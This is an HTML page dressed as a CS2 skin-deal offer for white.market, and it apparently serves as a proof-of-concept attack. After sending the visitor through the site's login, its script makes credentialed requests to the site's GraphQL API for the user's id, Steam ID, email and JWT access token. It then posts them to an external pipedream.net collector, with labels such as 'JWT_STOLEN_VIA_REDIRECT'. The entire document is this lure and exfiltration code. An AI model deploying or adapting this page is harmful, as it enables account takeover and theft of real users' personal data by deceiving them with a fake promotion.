<!DOCTYPE html>
<html>
<head><title>White Market - Exclusive Deals</title></head>
<body>
<h1>White Market Exclusive Deals</h1>
<p>Login to view exclusive CS2 skin deals - up to 50% off!</p>
<button onclick="startLogin()" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #4CAF50; color: white; border: none; border-radius: 5px;">
    ðŸ”“ Login with Steam to View Deals
</button>
<div id="status" style="margin-top: 20px;"></div>

<script>
const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';

function startLogin() {
    // Store that we're waiting for login
    localStorage.setItem('awaiting_login', 'true');
    localStorage.setItem('login_start', Date.now());
    
    // Redirect to login page
    window.location.href = 'https://white.market/login';
}

// Check if we just came back from login
if (localStorage.getItem('awaiting_login') === 'true') {
    document.getElementById('status').innerHTML = 'Checking login status...<br>';
    
    // Try to fetch user profile
    fetch('https://api.white.market/graphql/api', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'x-accept-language': 'en_US'
        },
        body: JSON.stringify({
            query: 'query { person: person_profile { id steamId email } }',
            operationName: 'PersonProfile'
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.data && data.data.person) {
            localStorage.removeItem('awaiting_login');
            
            document.getElementById('status').innerHTML = 'âœ… Login successful!<br>Steam ID: ' + data.data.person.steamId + '<br>';
            
            // Exfiltrate
            fetch(REQUESTBIN, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack: 'USER_DATA_STOLEN_VIA_REDIRECT',
                    victim: data.data.person,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Try JWT
            return fetch('https://api.white.market/graphql/api', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'x-accept-language': 'en_US'
                },
                body: JSON.stringify({
                    query: 'mutation AuthToken { auth_token { accessToken } }',
                    operationName: 'AuthToken'
                })
            });
        }
    })
    .then(r => r ? r.json() : null)
    .then(jwtData => {
        if (jwtData && jwtData.data && jwtData.data.auth_token) {
            document.getElementById('status').innerHTML += 'âœ… JWT stolen!<br>';
            
            fetch(REQUESTBIN, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack: 'JWT_STOLEN_VIA_REDIRECT',
                    jwt: jwtData.data.auth_token.accessToken,
                    timestamp: new Date().toISOString()
                })
            });
        }
        
        setTimeout(() => {
            window.location.href = 'https://white.market';
        }, 2000);
    });
}
</script>
</body>
</html>
